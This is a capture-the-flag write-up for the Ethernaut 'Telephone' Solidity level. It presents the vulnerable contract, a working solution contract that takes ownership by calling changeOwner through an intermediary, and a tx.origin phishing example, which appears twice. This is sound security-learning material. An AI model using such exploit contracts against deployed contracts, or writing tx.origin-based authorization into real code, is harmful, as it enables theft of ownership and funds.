![](https://ethernaut.openzeppelin.com/imgs/BigLevel4.svg)

Claim ownership of the contract below to complete this level.

  Things that might help

- See the ["?"](https://ethernaut.openzeppelin.com/help) page above, section "Beyond the console"

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

## Solution:

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ITelephone {
	function changeOwner(address _owner) external;
}

contract Telephone {
	address public send = msg.sender;
	address public ori = tx.origin;
	address public owner = 0x095454F216EC9485da86D49aDffAcFD0Fa3e5BE5;
	address public instance = 0x31169554fc55F56B0299fF41173f850daC181f32;
	function changeOwner() external {
		ITelephone(instance).changeOwner(owner);
	}
}
```

Тут надо было просто подменить owner-а. для этого просто написать контракт, который за меня вызовет функцию. 

While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).

An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
```

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```
function () payable {
  token.transfer(attackerAddress, 10000);
}
```

3. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.

___
While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).

An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```sol
function transfer(address _to, uint _value) {
  tokens[tx.origin] -= _value;
  tokens[_to] += _value;
}
```

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```sol
function () payable {
  token.transfer(attackerAddress, 10000);
}
```

3. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.